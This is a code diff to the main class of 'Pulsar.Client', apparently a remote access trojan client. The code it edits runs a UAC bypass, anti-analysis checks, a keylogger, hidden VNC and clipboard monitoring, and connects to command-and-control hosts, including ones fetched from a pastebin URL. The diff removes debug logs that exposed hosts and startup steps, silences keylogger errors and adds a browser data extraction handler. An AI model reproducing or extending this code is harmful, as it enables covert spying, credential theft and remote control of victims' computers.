@@ -1,4 +1,4 @@
-﻿using Pulsar.Client.Anti;
+using Pulsar.Client.Anti;
 using Pulsar.Client.Config;
 using Pulsar.Client.GUI;
 using Pulsar.Client.Helper.UAC;
@@ -116,25 +116,25 @@ namespace Pulsar.Client
         /// </summary>
         public PulsarApplication()
         {
-            string logFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_main.log");
+
             try
             {
-                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CTOR: Start\r\n"); } catch { }
+
                 Instance = this;
                 _messageProcessors = new List<IMessageProcessor>();
                 _notifyIcon = new NotifyIcon();
-                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CTOR: NotifyIcon created\r\n"); } catch { }
+
 
                 if (Settings.SHOWCLIENTGUI)
                 {
-                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CTOR: Creating ClientTrayIcon\r\n"); } catch { }
+
                     _trayIcon = new ClientTrayIcon(this);
                 }
-                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CTOR: Complete\r\n"); } catch { }
+
             }
             catch (Exception ex)
             {
-                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CTOR: EXCEPTION {ex.GetType().Name}: {ex.Message}\r\n"); } catch { }
+
                 throw;
             }
         }
@@ -145,20 +145,20 @@ namespace Pulsar.Client
         /// <param name="e">An System.EventArgs that contains the event data.</param>
         protected override void OnLoad(EventArgs e)
         {
-            string logFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_main.log");
+
             try
             {
-                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] ONLOAD: Start\r\n"); } catch { }
+
                 Visible = false;
                 ShowInTaskbar = false;
-                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] ONLOAD: Calling Run()\r\n"); } catch { }
+
                 Run();
-                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] ONLOAD: Run() returned\r\n"); } catch { }
+
                 base.OnLoad(e);
             }
             catch (Exception ex)
             {
-                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] ONLOAD: EXCEPTION {ex.GetType().Name}: {ex.Message}\r\n"); } catch { }
+
                 throw;
             }
         }
@@ -168,33 +168,29 @@ namespace Pulsar.Client
         /// </summary>
         public void Run()
         {
-            string logMainFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_main.log");
-            string logInitFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_init.log");
-            
-            try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] RUN: Start\r\n"); } catch { }
+
+
+
             
             try
             {
                 // decrypt and verify the settings
-                try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] RUN: Settings.Initialize()\r\n"); } catch { }
+
                 if (!Settings.Initialize())
                 {
-                    try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] RUN: Settings.Initialize() returned false - exit(1)\r\n"); } catch { }
+
                     Environment.Exit(1);
                 }
-                try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] RUN: Settings.Initialize() SUCCESS\r\n"); } catch { }
 
-                try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] RUN: DeferredAssemblyManager.Initialize()\r\n"); } catch { }
+
                 DeferredAssemblyManager.Initialize();
 
-                try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] RUN: Creating mutex\r\n"); } catch { }
                 ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);
 
                 // check if process with same mutex is already running on system
                 if (!ApplicationMutex.CreatedNew)
                     Environment.Exit(2);
 
-                try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] RUN: Manager.StartAnti()\r\n"); } catch { }
                 Manager.StartAnti();
 
                 if (Settings.UACBYPASS && !UAC.IsAdministrator())
@@ -256,64 +252,56 @@ namespace Pulsar.Client
 
                                     if (!DeferredAssemblyManager.TryEnsureAssembliesLoaded("Gma.System.MouseKeyHook"))
                                     {
-                                        Debug.WriteLine("Keylogger dependencies not yet available; deferring start.");
                                         return;
                                     }
 
                                     _keyloggerService = new KeyloggerService();
                                     _keyloggerService.Start();
                                 }
-                                catch (Exception ex)
+                                catch
                                 {
-                                    Debug.WriteLine($"Failed to start keylogger: {ex.Message}");
+                                    // Silently suppress keylogger startup errors
                                 }
                             });
                     }
 
                     try
                     {
-                        try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Start\r\n"); } catch { }
+
                         
                         PulsarClient client;
                         string hosts = Settings.HOSTS;
-                        
-                        try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: HOSTS=\"{hosts}\"\r\n"); } catch { }
+
 
                         if (Settings.PASTEBIN && 
                             (hosts.StartsWith("http://", StringComparison.OrdinalIgnoreCase) || 
                              hosts.StartsWith("https://", StringComparison.OrdinalIgnoreCase)))
                         {
-                            Debug.WriteLine("Using pastebin mode with URL: " + hosts);
-                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Pastebin mode\r\n"); } catch { }
+                            Debug.WriteLine("Using remote host configuration.");
+
                             var hostsManager = new HostsManager(hosts);
-                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Creating PulsarClient (pastebin)\r\n"); } catch { }
+
                             client = new PulsarClient(hostsManager, Settings.SERVERCERTIFICATE);
-                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: PulsarClient created (pastebin)\r\n"); } catch { }
+
                         }
                         else
                         {
                             Debug.WriteLine("Using standard host list mode");
-                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Standard mode - parsing hosts\r\n"); } catch { }
+
                             var hostsList = new HostsConverter().RawHostsToList(hosts);
-                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Parsed {hostsList.Count} hosts\r\n"); } catch { }
-                            foreach (var h in hostsList)
-                            {
-                                try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}]   - {h.Hostname}:{h.Port}\r\n"); } catch { }
-                            }
-                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Creating HostsManager\r\n"); } catch { }
+
                             var hostsManager = new HostsManager(hostsList);
-                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Creating PulsarClient\r\n"); } catch { }
+
                             client = new PulsarClient(hostsManager, Settings.SERVERCERTIFICATE);
-                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: PulsarClient created\r\n"); } catch { }
+
                         }
 
                         _connectClient = client;
-                        try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Subscribing to ClientState\r\n"); } catch { }
+
                         _connectClient.ClientState += ConnectClientOnClientState;
-                        try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: InitializeMessageProcessors\r\n"); } catch { }
+
                         InitializeMessageProcessors(_connectClient);
 
-                        try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: ActivityDetection\r\n"); } catch { }
                         _userActivityDetection = new ActivityDetection(_connectClient);
                         _userActivityDetection.Start();
 
@@ -321,34 +309,26 @@ namespace Pulsar.Client
                         _clipboardChecker = new ClipboardChecker(_connectClient);
                         UniversalDebugLogger.Initialize(_connectClient);
                         _debugLog = new DebugLog();
-                        try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: Starting ConnectLoop thread\r\n"); } catch { }
+
 
                         new Thread(() =>
                         {
-                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CONNECTLOOP: Thread start\r\n"); } catch { }
+
                             // Start connection loop on new thread and dispose application once client exits.
                             // This is required to keep the UI thread responsive and run the message loop.
                             _connectClient.ConnectLoop();
-                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CONNECTLOOP: Exited\r\n"); } catch { }
+
                             Environment.Exit(0);
                         }).Start();
                     }
                     catch (Exception ex)
                     {
-                        try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] CLIENT_INIT: EXCEPTION {ex.GetType().Name}: {ex.Message}\r\n"); } catch { }
-                        try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}]   Stack: {ex.StackTrace}\r\n"); } catch { }
-                        if (ex.InnerException != null)
-                        {
-                            try { System.IO.File.AppendAllText(logInitFile, $"[{System.DateTime.Now:HH:mm:ss.fff}]   Inner: {ex.InnerException.GetType().Name}: {ex.InnerException.Message}\r\n"); } catch { }
-                        }
                         Environment.Exit(7);
                     }
                 }
             }
             catch (Exception ex)
             {
-                try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] RUN: OUTER EXCEPTION {ex.GetType().Name}: {ex.Message}\r\n"); } catch { }
-                try { System.IO.File.AppendAllText(logMainFile, $"[{System.DateTime.Now:HH:mm:ss.fff}]   Stack: {ex.StackTrace}\r\n"); } catch { }
                 Environment.Exit(97);
             }
         }
@@ -403,6 +383,7 @@ namespace Pulsar.Client
             RegisterProcessor(new HVNCHandler());
             RegisterProcessor(new ClientServicesHandler(this, client));
             RegisterProcessor(new FileManagerHandler(client));
+            RegisterProcessor(new BrowserExtractionHandler(client));
             RegisterProcessor(new KeyloggerHandler());
             RegisterProcessor(new MessageBoxHandler());
             RegisterProcessor(new ClipboardHandler());
@@ -530,6 +511,8 @@ namespace Pulsar.Client
                 CleanupMessageProcessors();
                 _keyloggerService?.Dispose();
                 _userActivityDetection?.Dispose();
+                _activeWindowChecker?.Dispose();
+                _clipboardChecker?.Dispose();
                 ApplicationMutex?.Dispose();
                 _connectClient?.Dispose();
                 _notifyIcon.Visible = false;
